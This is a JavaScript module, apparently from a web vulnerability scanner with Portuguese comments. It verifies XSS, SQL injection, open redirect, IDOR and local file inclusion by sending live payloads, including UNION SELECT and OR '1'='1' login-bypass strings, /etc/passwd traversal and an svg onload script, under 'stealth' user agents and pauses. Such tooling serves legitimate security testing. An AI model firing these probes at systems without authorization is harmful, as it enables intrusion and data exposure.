import crypto from 'crypto';
import { stealthPause, pickStealthUserAgent } from './request-policy.js';

const XSS_PARAM_RE = /^(q|query|search|s|keyword|term|message|comment|title|name)$/i;
export const SQLI_PARAM_RE =
  /^(id|ids|user|user_id|uid|account|order|order_id|page|sort|filter|where|username|email|passwd|pwd|login)$/i;
/** Paths típicos de formulário de login (prova OR 1=1 só aqui, com verify_sqli_deep). */
const LOGIN_PATH_RE = /(\/|^)(login|sign-in|signin|auth)(\/|$)/i;
const AUTH_SQLI_PARAM_RE = /^(user(name)?|email|pass(word)?|login|pwd)$/i;
const REDIRECT_PARAM_RE = /^(redirect|url|next|return|return_url|dest|target|goto|callback)$/i;
const IDOR_PARAM_RE = /^(id|user_id|uid|account|order_id|profile_id|invoice_id)$/i;
const LFI_PARAM_RE = /^(file|path|page|template|include|inc|doc|document|folder|dir|download|view|cat)$/i;
/** Padrões comuns de erro SQL em respostas HTML/JSON (probe simples com '). */
const SQL_ERROR_RE =
  /(sql syntax|mysql_fetch|mysqli_(query|sql)|sqlstate\[|PDOException|quoted string not properly terminated|unclosed quotation|syntax error at or near|sqlite error|postgresql|ORA-\d{4,5}|Microsoft OLE DB Provider|ODBC SQL Server Driver|Sybase message|Warning:\s*mysql_|You have an error in your SQL syntax)/i;
const LFI_UNIX_RE = /(root:x:0:0:|daemon:x:|bin:x:|nobody:x:|\/bin\/bash|\/usr\/sbin\/nologin)/i;
const LFI_WIN_RE = /(\[extensions\]|\[fonts\]|\[mci extensions\]|for 16-bit app support)/i;

function nowIso() {
  return new Date().toISOString();
}

function buildHeaders(auth = {}, modules = []) {
  const h = {
    'User-Agent': pickStealthUserAgent(modules),
    Accept: 'text/html,application/xhtml+xml,application/json,*/*;q=0.8',
  };
  const extra = auth?.headers && typeof auth.headers === 'object' ? auth.headers : {};
  for (const [k, v] of Object.entries(extra)) {
    if (!k || v == null) continue;
    h[String(k)] = String(v);
  }
  if (auth?.cookie) h.Cookie = String(auth.cookie);
  return h;
}

async function fetchText(url, { auth, timeoutMs = 12000, modules = [] } = {}) {
  await stealthPause(modules);
  const res = await fetch(url, {
    method: 'GET',
    redirect: 'manual',
    signal: AbortSignal.timeout(timeoutMs),
    headers: buildHeaders(auth, modules),
  });
  const text = await res.text().catch(() => '');
  return { status: res.status, headers: res.headers, text: text.slice(0, 160000), location: res.headers.get('location') || '' };
}

function sampleSnippet(text, needle, radius = 90) {
  const s = String(text || '');
  if (!needle) return s.slice(0, 180);
  const i = s.toLowerCase().indexOf(String(needle).toLowerCase());
  if (i < 0) return s.slice(0, 180);
  const st = Math.max(0, i - radius);
  const en = Math.min(s.length, i + String(needle).length + radius);
  return s.slice(st, en).replace(/\s+/g, ' ').trim();
}

export function evidenceHash(evidence) {
  const raw = JSON.stringify({
    source: evidence?.source || '',
    url: evidence?.url || '',
    method: evidence?.method || '',
    status: evidence?.status || 0,
    requestSnippet: evidence?.requestSnippet || '',
    responseSnippet: evidence?.responseSnippet || '',
  });
  return crypto.createHash('sha256').update(raw).digest('hex');
}

export function responseLooksLikeSqlError(text) {
  return SQL_ERROR_RE.test(String(text || ''));
}

/** Primeiro índice ORDER BY n em que aparece erro SQL quando o passo anterior não tinha (vs baseline). */
export function orderByFirstSqlErrorTransition(errBase, snapshots) {
  let prev = !!errBase;
  for (const snap of snapshots || []) {
    const cur = !!snap.sqlErr;
    if (cur && !prev) return snap.n;
    prev = cur;
  }
  return null;
}

/** Pequenos sinais por coluna k em UNION SELECT NULL,... (sem exfiltração). */
export function unionNullProbeSignals(rb, errBase, snapshots) {
  const bits = [];
  const baseLen = String(rb?.text || '').length;
  for (const s of snapshots || []) {
    if (typeof s.k !== 'number') continue;
    if (!!s.sqlErr !== !!errBase) bits.push(`k${s.k}:sql_ne_base`);
    if (baseLen > 80 && s.len > 0) {
      const ratio = Math.abs(s.len - baseLen) / baseLen;
      if (ratio > 0.18) bits.push(`k${s.k}:d_body`);
    }
  }
  return bits;
}

function sqlErrorResponseSnippet(text) {
  const s = String(text || '');
  const m = s.match(SQL_ERROR_RE);
  if (m && m[0]) return sampleSnippet(s, m[0], 140);
  return s.slice(0, 220).replace(/\s+/g, ' ').trim();
}

/**
 * Sondas extra (ORDER BY 1..N, UNION NULL×k, NULL FROM DUAL, OR 1=1 em login).
 * Só com módulo verify_sqli_deep; não enumera information_schema nem sleep.
 */
async function collectSqliDeepMeta(u, paramKey, baseVal, auth, modules, rb, errBase) {
  const bits = [];
  const orderSnapshots = [];
  for (let n = 1; n <= 12; n++) {
    const x = new URL(u.href);
    x.searchParams.set(paramKey, `${baseVal}' ORDER BY ${n}--+`);
    try {
      const r = await fetchText(x.href, { auth, modules });
      orderSnapshots.push({ n, sqlErr: responseLooksLikeSqlError(r.text), status: r.status });
    } catch {
      orderSnapshots.push({ n, sqlErr: false, status: 0 });
    }
  }
  const obErr = orderByFirstSqlErrorTransition(errBase, orderSnapshots);
  if (obErr != null) bits.push(`orderby_sqlerr@${obErr}`);
  const stFirst = orderSnapshots.find((s) => s.status > 0 && s.status !== rb.status)?.n;
  if (stFirst != null) bits.push(`orderby_status@${stFirst}`);

  const unionSnaps = [];
  for (let k = 1; k <= 6; k++) {
    const unionSel = Array(k)
      .fill('NULL')
      .join(',');
    const x = new URL(u.href);
    x.searchParams.set(paramKey, `${baseVal}' UNION SELECT ${unionSel}-- -`);
    try {
      const r = await fetchText(x.href, { auth, modules });
      unionSnaps.push({ k, sqlErr: responseLooksLikeSqlError(r.text), len: r.text.length, status: r.status });
    } catch {
      unionSnaps.push({ k, sqlErr: false, len: 0, status: 0 });
    }
  }
  const uBits = unionNullProbeSignals(rb, errBase, unionSnaps);
  if (uBits.length) bits.push(`union:${uBits.slice(0, 5).join(',')}`);

  const xdu = new URL(u.href);
  xdu.searchParams.set(paramKey, `${baseVal}' UNION SELECT NULL FROM DUAL-- -`);
  try {
    const rd = await fetchText(xdu.href, { auth, modules });
    const r1 = unionSnaps[0];
    if (r1 && responseLooksLikeSqlError(rd.text) !== r1.sqlErr) bits.push('dual_sql_ne_k1');
    else if (r1 && r1.len > 40 && Math.abs(rd.text.length - r1.len) / r1.len > 0.16) bits.push('dual_d_body');
  } catch {
    /* ignore */
  }

  if (LOGIN_PATH_RE.test(u.pathname) && AUTH_SQLI_PARAM_RE.test(String(paramKey).toLowerCase())) {
    const xa = new URL(u.href);
    xa.searchParams.set(paramKey, `${baseVal}' OR '1'='1'--+`);
    try {
      const ra = await fetchText(xa.href, { auth, modules });
      const lb = rb.text.length;
      const la = ra.text.length;
      if (ra.status !== rb.status || (lb > 80 && Math.abs(la - lb) / lb > 0.12)) bits.push('or_true_delta');
    } catch {
      /* ignore */
    }
  }

  return bits.length ? bits.join(';') : '';
}

function collectEndpointUrlsForVerify(findings, maxEndpoints) {
  const cap = Math.max(1, maxEndpoints);
  const urls = new Set();
  for (const f of findings || []) {
    if (f?.type === 'endpoint' && typeof f.value === 'string' && /^https?:\/\//i.test(f.value)) urls.add(f.value);
  }
  for (const f of findings || []) {
    if (f?.type !== 'param' || typeof f.url !== 'string' || !/^https?:\/\//i.test(f.url)) continue;
    const m = String(f.value || '').match(/^\?([a-zA-Z_][a-zA-Z0-9_]{0,64})=\s*$/);
    if (!m) continue;
    const pName = m[1];
    if (!SQLI_PARAM_RE.test(pName)) continue;
    try {
      const u = new URL(f.url);
      if (u.searchParams.has(pName)) urls.add(f.url);
    } catch {
      /* ignore */
    }
  }
  return [...urls].slice(0, cap);
}

function pushVerificationFinding(out, kind, classification, score, value, meta, evidence) {
  out.push({
    type: kind,
    prio: classification === 'confirmed' ? 'high' : classification === 'probable' ? 'med' : 'low',
    score,
    value,
    meta,
    verification: {
      classification,
      evidence: { ...evidence, evidenceHash: evidenceHash(evidence) },
      verifiedAt: nowIso(),
    },
    url: evidence?.url || null,
  });
}

export async function runEvidenceVerification({ findings, auth, log, maxEndpoints = 36, modules = [] }) {
  const out = [];
  const endpointUrls = collectEndpointUrlsForVerify(findings, maxEndpoints);

  if (!endpointUrls.length) return out;
  if (typeof log === 'function') log(`Verify: analisando ${endpointUrls.length} endpoint(s)`, 'info');

  for (const raw of endpointUrls) {
    let u;
    try {
      u = new URL(raw);
    } catch {
      continue;
    }
    const params = [...u.searchParams.keys()].slice(0, 8);
    if (!params.length) continue;

    for (const p of params) {
      const param = String(p || '').toLowerCase();

      if (XSS_PARAM_RE.test(param)) {
        const marker = `ghxss_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 7)}`;
        const payload = `"'><${marker}>`;
        const x = new URL(u.href);
        x.searchParams.set(p, payload);
        try {
          const r = await fetchText(x.href, { auth, modules });
          const reflectedRaw = r.text.includes(payload);
          const reflectedMarker = r.text.includes(marker);
          const escaped = r.text.includes('&lt;') && r.text.includes(marker);
          const classification = reflectedRaw && !escaped ? 'confirmed' : reflectedMarker ? 'probable' : 'noisy';
          const score = classification === 'confirmed' ? 96 : classification === 'probable' ? 76 : 36;
          pushVerificationFinding(
            out,
            'xss',
            classification,
            score,
            `Verify XSS ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
            `verify=xss • param=${p} • reflected=${reflectedMarker ? 'yes' : 'no'} • escaped=${escaped ? 'yes' : 'no'} • confidence=${classification}`,
            {
              source: 'verify-xss',
              url: x.href,
              method: 'GET',
              status: r.status,
              requestSnippet: `${x.pathname}?${p}=${payload}`,
              responseSnippet: sampleSnippet(r.text, marker),
              timestamp: nowIso(),
            },
          );
        } catch {
          /* ignore */
        }
      }

      if (SQLI_PARAM_RE.test(param)) {
        const b = new URL(u.href);
        const t = new URL(u.href);
        const rawVal = u.searchParams.get(p);
        const baseVal = rawVal != null && String(rawVal).length > 0 ? String(rawVal) : '1';
        const testVal = `${baseVal}'`;
        b.searchParams.set(p, baseVal);
        t.searchParams.set(p, testVal);
        try {
          const [rb, rt] = await Promise.all([
            fetchText(b.href, { auth, modules }),
            fetchText(t.href, { auth, modules }),
          ]);
          const errBase = responseLooksLikeSqlError(rb.text);
          const errTest = responseLooksLikeSqlError(rt.text);
          const statusDiff = rb.status !== rt.status;
          const classification = errTest && !errBase ? 'confirmed' : statusDiff ? 'probable' : 'noisy';
          const score = classification === 'confirmed' ? 95 : classification === 'probable' ? 72 : 34;
          let deepSqli = '';
          if (
            modules.includes('verify_sqli_deep') &&
            (classification === 'confirmed' || classification === 'probable')
          ) {
            try {
              deepSqli = await collectSqliDeepMeta(u, p, baseVal, auth, modules, rb, errBase);
            } catch {
              /* ignore */
            }
          }
          const metaSqli = [
            `verify=sqli • param=${p} • probe=${encodeURIComponent(baseVal)}→${encodeURIComponent(testVal)} • sql_error=${errTest ? 'yes' : 'no'} • status_diff=${statusDiff ? 'yes' : 'no'} • confidence=${classification}`,
            deepSqli ? `deep=${deepSqli}` : '',
          ]
            .filter(Boolean)
            .join(' • ');
          pushVerificationFinding(
            out,
            'sqli',
            classification,
            score,
            `Verify SQLi ${classification.toUpperCase()} @ ${t.pathname} ?${p}=`,
            metaSqli,
            {
              source: 'verify-sqli',
              url: t.href,
              method: 'GET',
              status: rt.status,
              requestSnippet: `${t.pathname}?${p}=${testVal}${deepSqli ? ` (+deep: ORDER BY… UNION…)` : ''}`,
              responseSnippet: sqlErrorResponseSnippet(rt.text),
              timestamp: nowIso(),
            },
          );
        } catch {
          /* ignore */
        }
      }

      if (REDIRECT_PARAM_RE.test(param)) {
        const x = new URL(u.href);
        x.searchParams.set(p, 'https://example.org/');
        try {
          const r = await fetchText(x.href, { auth, modules });
          const loc = String(r.location || '');
          const confirmed = /^https?:\/\/example\.org\/?/i.test(loc);
          const probable = !confirmed && /example\.org/i.test(r.text);
          const classification = confirmed ? 'confirmed' : probable ? 'probable' : 'noisy';
          const score = classification === 'confirmed' ? 94 : classification === 'probable' ? 70 : 30;
          pushVerificationFinding(
            out,
            'open_redirect',
            classification,
            score,
            `Verify Open Redirect ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
            `verify=open_redirect • param=${p} • location=${loc ? 'present' : 'none'} • confidence=${classification}`,
            {
              source: 'verify-open-redirect',
              url: x.href,
              method: 'GET',
              status: r.status,
              requestSnippet: `${x.pathname}?${p}=https://example.org/`,
              responseSnippet: loc || sampleSnippet(r.text, 'example.org'),
              timestamp: nowIso(),
            },
          );
        } catch {
          /* ignore */
        }
      }

      if (IDOR_PARAM_RE.test(param)) {
        const b = new URL(u.href);
        const t = new URL(u.href);
        b.searchParams.set(p, '1');
        t.searchParams.set(p, '2');
        try {
          const [rb, rt] = await Promise.all([
            fetchText(b.href, { auth, modules }),
            fetchText(t.href, { auth, modules }),
          ]);
          const sameStatus = rb.status === rt.status;
          const bodyChanged = rb.text.slice(0, 4000) !== rt.text.slice(0, 4000);
          const maybeUnauthorized = [401, 403].includes(rt.status);
          const classification = sameStatus && bodyChanged && !maybeUnauthorized ? 'probable' : 'noisy';
          const score = classification === 'probable' ? 68 : 28;
          pushVerificationFinding(
            out,
            'idor',
            classification,
            score,
            `Verify IDOR ${classification.toUpperCase()} @ ${t.pathname} ?${p}=`,
            `verify=idor • param=${p} • status_base=${rb.status} status_test=${rt.status} • body_changed=${bodyChanged ? 'yes' : 'no'} • confidence=${classification}`,
            {
              source: 'verify-idor',
              url: t.href,
              method: 'GET',
              status: rt.status,
              requestSnippet: `${t.pathname}?${p}=2`,
              responseSnippet: sampleSnippet(rt.text, ''),
              timestamp: nowIso(),
            },
          );
        } catch {
          /* ignore */
        }
      }

      if (LFI_PARAM_RE.test(param)) {
        const payloads = [
          '../../../../../../../etc/passwd',
          '..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
          '..%252f..%252f..%252f..%252fetc%252fpasswd',
          '..\\..\\..\\..\\..\\windows\\win.ini',
        ];
        for (const payload of payloads) {
          const x = new URL(u.href);
          x.searchParams.set(p, payload);
          try {
            const r = await fetchText(x.href, { auth, modules });
            const unixHit = LFI_UNIX_RE.test(r.text);
            const winHit = LFI_WIN_RE.test(r.text);
            const hasTraversalError = /(failed to open stream|no such file|permission denied|include\(\)|fopen\()/i.test(
              r.text,
            );
            const classification = unixHit || winHit ? 'confirmed' : hasTraversalError ? 'probable' : 'noisy';
            const score = classification === 'confirmed' ? 97 : classification === 'probable' ? 70 : 30;
            const marker = unixHit ? 'etc/passwd signature' : winHit ? 'win.ini signature' : 'error-pattern';
            pushVerificationFinding(
              out,
              'lfi',
              classification,
              score,
              `Verify LFI ${classification.toUpperCase()} @ ${x.pathname} ?${p}=`,
              `verify=lfi • param=${p} • payload=${payload.slice(0, 40)} • marker=${marker} • confidence=${classification}`,
              {
                source: 'verify-lfi',
                url: x.href,
                method: 'GET',
                status: r.status,
                requestSnippet: `${x.pathname}?${p}=${payload}`,
                responseSnippet: sampleSnippet(r.text, unixHit ? 'root:x:' : winHit ? '[extensions]' : 'failed'),
                timestamp: nowIso(),
              },
            );
            if (classification === 'confirmed') break;
          } catch {
            /* ignore */
          }
        }
      }
    }
  }

  return out;
}

/**
 * Segunda ronda leve: variantes de payload em XSS classificados como probable (micro-exploit).
 */
export async function runMicroExploitVariants({ findings, auth, log, modules = [], maxTests = 14 }) {
  const out = [];
  const tried = new Set();
  let count = 0;
  for (const f of findings) {
    if (f.type !== 'xss') continue;
    if (f.verification?.classification !== 'probable') continue;
    const urlStr = f.verification?.evidence?.url || f.url;
    if (!urlStr || typeof urlStr !== 'string') continue;
    if (tried.has(urlStr)) continue;
    tried.add(urlStr);
    if (count >= maxTests) break;
    let u;
    try {
      u = new URL(urlStr);
    } catch {
      continue;
    }
    const params = [...u.searchParams.keys()];
    if (!params.length) continue;
    const p = params[0];
    const payload = String.raw`"><svg/onload=alert(1)>`;
    const x = new URL(u.href);
    x.searchParams.set(p, payload);
    try {
      const r = await fetchText(x.href, { auth, modules });
      const raw = r.text.includes(payload);
      const loose = /onload\s*=\s*alert/i.test(r.text) && /<svg/i.test(r.text);
      const classification = raw ? 'confirmed' : loose ? 'probable' : 'noisy';
      const score = classification === 'confirmed' ? 97 : classification === 'probable' ? 82 : 32;
      pushVerificationFinding(
        out,
        'xss',
        classification,
        score,
        `Micro-exploit XSS ${classification.toUpperCase()} @ ${x.pathname} ?${p}= (variante svg)`,
        `verify=micro_xss • param=${p} • variant=svg_onload • confidence=${classification}`,
        {
          source: 'micro-exploit-xss',
          url: x.href,
          method: 'GET',
          status: r.status,
          requestSnippet: `${x.pathname}?${p}=…`,
          responseSnippet: sampleSnippet(r.text, 'svg'),
          timestamp: nowIso(),
        },
      );
      count++;
    } catch {
      /* ignore */
    }
  }
  if (out.length && typeof log === 'function') {
    log(`Micro-exploit: ${out.length} teste(s) de variante XSS após verify`, 'info');
  }
  return out;
}
